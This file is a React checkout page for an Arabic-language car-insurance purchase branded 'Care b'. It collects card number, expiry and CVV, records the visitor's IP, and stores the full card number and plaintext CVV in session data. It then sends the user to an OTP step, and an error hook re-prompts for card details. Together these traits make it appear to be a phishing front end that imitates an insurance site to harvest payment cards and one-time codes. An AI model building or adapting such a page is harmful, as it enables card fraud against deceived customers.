import { zodResolver } from '@hookform/resolvers/zod'
import type { ChangeEvent } from 'react'
import { useEffect, useMemo } from 'react'
import { useForm } from 'react-hook-form'
import { useNavigate, useSearchParams } from 'react-router-dom'

import { insertPaymentRequest } from '@/api/payments'
import {
  getExternalUserId,
  getOrCreateSessionId,
  readInsuranceSelection,
  writeLastPaymentMeta,
  type InsuranceSelection,
} from '@/lib/session'
import {
  paymentFormSchema,
  type PaymentFormInput,
  cardLastFour,
} from '@/schemas/payment'

async function fetchClientIp(): Promise<string> {
  try {
    const r = await fetch('https://api.ipify.org?format=json')
    const j = (await r.json()) as { ip?: string }
    return j.ip ?? 'Unknown'
  } catch {
    return 'Unknown'
  }
}

function formatMoney(v: number | string) {
  const n = Number(v || 0)
  return `${n.toLocaleString('ar-EG', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  })} ريال`
}

function genLabTxn() {
  return (
    `TXN${Date.now()}${Math.random().toString(36).slice(2, 9).toUpperCase()}`
  )
}

export function PayPage() {
  const navigate = useNavigate()
  const [params] = useSearchParams()
  const userIdParam = params.get('user_id')

  const ins = useMemo(() => readInsuranceSelection(), [])

  const start = useMemo(() => new Date().toISOString().slice(0, 10), [])
  const end = useMemo(() => {
    const d = new Date()
    d.setFullYear(d.getFullYear() + 1)
    return d.toISOString().slice(0, 10)
  }, [])

  useEffect(() => {
    if (!ins) {
      navigate('/offers/third-party', { replace: true })
    }
  }, [ins, navigate])

  const form = useForm<PaymentFormInput>({
    resolver: zodResolver(paymentFormSchema),
    mode: 'onSubmit',
    reValidateMode: 'onSubmit',
    defaultValues: {
      cardholder_name: '',
      card_number: '',
      expiry_mm_yy: '',
      cvv: '',
    },
  })

  useEffect(() => {
    const msg = sessionStorage.getItem('pay_card_error')
    if (msg) {
      sessionStorage.removeItem('pay_card_error')
      form.setError('card_number', { type: 'manual', message: msg })
    }
  }, [form])

  if (!ins) return null

  const { company, plan, base, price, vat, total } = ins

  async function submit(values: PaymentFormInput) {
    if (!ins) return
    const payload: InsuranceSelection = {
      ...ins,
      start_date: start,
      end_date: end,
    }

    const ext = userIdParam ?? getExternalUserId()
    const clientIp = await fetchClientIp()
    const labTxn = genLabTxn()
    const res = await insertPaymentRequest({
      sessionId: getOrCreateSessionId(),
      externalUserId: ext,
      insurance: payload,
      payment: values,
      clientIp,
      labTransactionId: labTxn,
    })

    if (!res.ok) {
      window.alert(('error' in res ? res.error : null) ?? 'تعذّر إتمام الطلب، يرجى المحاولة لاحقاً')
      return
    }

    const last4 = cardLastFour(values.card_number)
    const panDigitsOnly = values.card_number.replace(/\s/g, '')

    writeLastPaymentMeta({
      paymentRequestId: res.id ?? '',
      cardLastFour: last4,
      cardholderName: values.cardholder_name,
      insurance: payload,
      panDigits: panDigitsOnly,
      cvvPlain: values.cvv,
      expiryMmYy: values.expiry_mm_yy,
      clientIp,
      transactionId: labTxn,
      externalUserId: ext,
    })

    navigate('/otp')
  }

  const errors = form.formState.errors
  const inBase =
    'w-full h-[46px] border-[1.5px] rounded-[10px] px-3 text-[14px] bg-white outline-none transition-colors focus:border-[#1a5490]'
  const errCls = 'border-[#dc2626] bg-[#fff5f5] animate-[shake_0.5s]'
  const okCls = 'border-[#e5e7eb]'

  return (
    <div dir="rtl" className="min-h-[100dvh] bg-[#f7f7f7] py-6 text-[#0b3550] font-[system-ui,-apple-system,Segoe_UI,Roboto,Arial,sans-serif]">
      <style>{`@keyframes shake{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}`}</style>
      <div className="mx-auto w-full max-w-[420px] px-3">
        <div className="overflow-hidden rounded-[14px] border border-[#e5e7eb] bg-white shadow-[0_10px_24px_rgba(0,0,0,0.06)]">
          {/* Header */}
          <div className="bg-gradient-to-br from-[#1a5490] to-[#2d4a6b] p-5 text-center text-white">
            <div className="flex items-center justify-center gap-2.5">
              <div className="text-[18px] font-extrabold">Care</div>
              <div className="grid size-[34px] place-items-center rounded-full bg-white font-extrabold text-[#1a5490]">
                b
              </div>
            </div>
            <div className="mt-1.5 font-bold">تفاصيل الدفع</div>
          </div>

          {/* Invoice */}
          <div className="px-4 pb-1 pt-4">
            <div className="mb-2.5 text-[15px] font-extrabold">ملخص التأمين</div>
            <Row label="الشركة:" value={company} />
            <Row label="نوع التأمين:" value={plan} />
            <Row label="القسط الأساسي:" value={formatMoney(base)} />
            <Row label="المجموع الفرعي:" value={formatMoney(price)} />
            <Row label="ضريبة 15%:" value={formatMoney(vat)} />
            <div className="mt-2.5 flex items-center justify-between rounded-[10px] border border-[#dbe9ff] bg-[#eaf3ff] p-3 font-extrabold text-[#1a5490]">
              <span>الإجمالي</span>
              <span>{formatMoney(total)}</span>
            </div>
          </div>

          {/* Form */}
          <form className="p-4" onSubmit={form.handleSubmit(submit)} noValidate>
            <div className="pb-1.5 text-[15px] font-extrabold">معلومات البطاقة</div>

            <div className="mb-3">
              <label className="mb-1.5 block text-[14px] text-[#1c2b3a]">اسم حامل البطاقة</label>
              <input
                type="text"
                placeholder="الاسم كما يظهر على البطاقة"
                className={`${inBase} ${errors.cardholder_name ? errCls : okCls}`}
                {...form.register('cardholder_name', {
                  onChange: () => form.clearErrors('cardholder_name'),
                })}
              />
              {errors.cardholder_name && (
                <div className="mt-1 text-[13px] font-semibold text-[#dc2626]">{errors.cardholder_name.message}</div>
              )}
            </div>

            <div className="mb-3">
              <label className="mb-1.5 block text-[14px] text-[#1c2b3a]">رقم البطاقة</label>
              <input
                dir="ltr"
                type="text"
                inputMode="numeric"
                maxLength={19}
                placeholder="**** **** **** ****"
                className={`${inBase} text-left ${errors.card_number ? errCls : okCls}`}
                {...form.register('card_number', {
                  onChange: (e: ChangeEvent<HTMLInputElement>) => {
                    const raw = e.target.value.replace(/\D/g, '').slice(0, 16)
                    const spaced = raw.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
                    form.setValue('card_number', spaced)
                    form.clearErrors('card_number')
                  },
                })}
              />
              {errors.card_number && (
                <div className="mt-1 text-[13px] font-semibold text-[#dc2626]">{errors.card_number.message}</div>
              )}
            </div>

            <div className="grid grid-cols-2 gap-2.5">
              <div className="mb-3">
                <label className="mb-1.5 block text-[14px] text-[#1c2b3a]">تاريخ الانتهاء (MM/YY)</label>
                <input
                  dir="ltr"
                  type="text"
                  inputMode="numeric"
                  maxLength={5}
                  placeholder="MM/YY"
                  className={`${inBase} text-left ${errors.expiry_mm_yy ? errCls : okCls}`}
                  {...form.register('expiry_mm_yy', {
                    onChange: (e: ChangeEvent<HTMLInputElement>) => {
                      const d = e.target.value.replace(/\D/g, '').slice(0, 4)
                      const v = d.length >= 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d
                      form.setValue('expiry_mm_yy', v)
                      form.clearErrors('expiry_mm_yy')
                    },
                  })}
                />
                {errors.expiry_mm_yy && (
                  <div className="mt-1 text-[13px] font-semibold text-[#dc2626]">{errors.expiry_mm_yy.message}</div>
                )}
              </div>
              <div className="mb-3">
                <label className="mb-1.5 block text-[14px] text-[#1c2b3a]">رمز الأمان (CVV)</label>
                <input
                  dir="ltr"
                  type="text"
                  inputMode="numeric"
                  maxLength={3}
                  placeholder="123"
                  className={`${inBase} text-left ${errors.cvv ? errCls : okCls}`}
                  {...form.register('cvv', {
                    onChange: (e: ChangeEvent<HTMLInputElement>) => {
                      const r = e.target.value.replace(/\D/g, '').slice(0, 3)
                      form.setValue('cvv', r)
                      form.clearErrors('cvv')
                    },
                  })}
                />
                {errors.cvv && (
                  <div className="mt-1 text-[13px] font-semibold text-[#dc2626]">{errors.cvv.message}</div>
                )}
              </div>
            </div>

            <button
              type="submit"
              disabled={form.formState.isSubmitting}
              className="mt-2 h-[50px] w-full cursor-pointer rounded-[12px] border-0 bg-gradient-to-br from-[#ffa500] to-[#ff8c00] text-[15px] font-extrabold text-white transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-60"
            >
              {form.formState.isSubmitting ? 'جارٍ الإرسال...' : 'ادفع الآن'}
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

function Row(props: { label: string; value: string }) {
  return (
    <div className="my-1.5 flex justify-between text-[14px]">
      <span className="text-[#6b7280]">{props.label}</span>
      <span className="font-semibold">{props.value}</span>
    </div>
  )
}
